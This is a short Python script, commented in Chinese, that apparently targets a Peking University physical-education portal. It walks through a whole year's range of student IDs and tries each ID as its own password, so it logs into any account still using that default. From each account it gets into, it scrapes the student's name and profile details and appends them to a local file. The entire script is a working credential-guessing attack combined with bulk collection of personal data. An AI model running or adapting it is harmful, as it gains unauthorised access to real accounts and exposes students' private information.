import urllib.request
import urllib.parse
import http.cookiejar
import gzip
from bs4 import BeautifulSoup
url="http://b.edooon.com/login"
headers={
	"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"Accept-Encoding":"gzip, deflate",
	"Accept-Language":"zh-CN,zh;q=0.8,en;q=0.6",
	"Cache-Control":"max-age=0",
	"Connection":"keep-alive",
	"Content-Length":"34",
	"Content-Type":"application/x-www-form-urlencoded",
	"Host":"b.edooon.com",
	"Origin":"http://b.edooon.com",
	"Referer":"http://b.edooon.com/school/pku/login.jsp",
	"Upgrade-Insecure-Requests":"1",
	"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36"
}
#创建自动处理POST返回cookie实现正确跳转的容器
cj=http.cookiejar.CookieJar()
opener=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
i=1500010001
num=0
#遍历当前年级所有学号 因部分学号分布的离散性未作跳跃处理
while i<1500020000:
	data={
		"uname":str(i),
		"passwd":str(i)
	}
	data=urllib.parse.urlencode(data).encode("utf-8")
	req=urllib.request.Request(url,data,headers)
	response=opener.open(req)
	#本学期未注册体育课或不存在学号
	if response.geturl().find("error")!=-1:
		print("STUDENT ID "+str(i)+" NOT REGISTERED\n")
		i+=1
		continue
	i+=1
	num+=1
	gpage=response.read()
	page=gzip.decompress(gpage).decode("utf-8")
	soup=BeautifulSoup(page,"lxml")
	info=soup.find_all("div",class_="userBar")[0].find_all("div")[0].find_all("span",class_="userNav")
	name=info[0].string
	while len(name)<4:
		name="："+name
	print("PROCESSING CURRENT OBJECT NAME "+name+" ALL COUNTED "+str(num)+"\n")
	with open("PKUPES_Student_Info_2015.txt","a+") as f:
		f.write("{0}  {1}{2} {3:>4}   {4}   {5}\n".format(info[5].string,info[3].string,info[4].string,name,info[1].string,info[2].string))